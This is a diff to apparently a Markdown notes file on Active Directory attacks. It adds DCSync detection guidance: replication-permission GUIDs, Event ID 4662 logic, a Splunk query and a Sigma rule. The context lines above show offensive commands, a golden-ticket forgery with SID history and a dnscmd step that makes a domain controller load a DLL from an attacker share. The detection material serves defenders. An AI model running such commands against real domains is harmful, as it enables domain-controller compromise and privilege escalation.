@@ -54,3 +54,39 @@ kerberos::golden /domain:child.domain.local /sid:CHILD_SID /sids:PARENT_EA_SID /
 dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\evil.dll
 sc \\DC01 stop dns & sc \\DC01 start dns
 ```
+
+## DCSync Detection
+
+### Replication Permission GUIDs
+Three GUIDs indicate DCSync capability:
+- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` — DS-Replication-Get-Changes
+- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` — DS-Replication-Get-Changes-All
+- `89e95b76-444d-4c62-991a-0facbeda640c` — DS-Replication-Get-Changes-In-Filtered-Set
+
+### Event-Based Detection
+- **Event ID 4662** with above GUIDs from non-DC source = DCSync attempt
+- Filter machine accounts ending with `$` (DCs replicate legitimately)
+- Non-DC user triggering replication = CRITICAL alert
+
+Splunk:
+```
+index=windows EventCode=4662 Properties IN ("1131f6aa*","1131f6ad*","89e95b76*") | where NOT match(SubjectUserName, "\$$") | table _time, SubjectUserName, SubjectDomainName, ObjectName
+```
+
+Sigma rule (vendor-agnostic):
+```yaml
+title: DCSync Attack Detected
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4662
+    Properties|contains:
+      - '1131f6aa'
+      - '1131f6ad'
+  filter:
+    SubjectUserName|endswith: '$'
+  condition: selection and not filter
+level: critical
+```
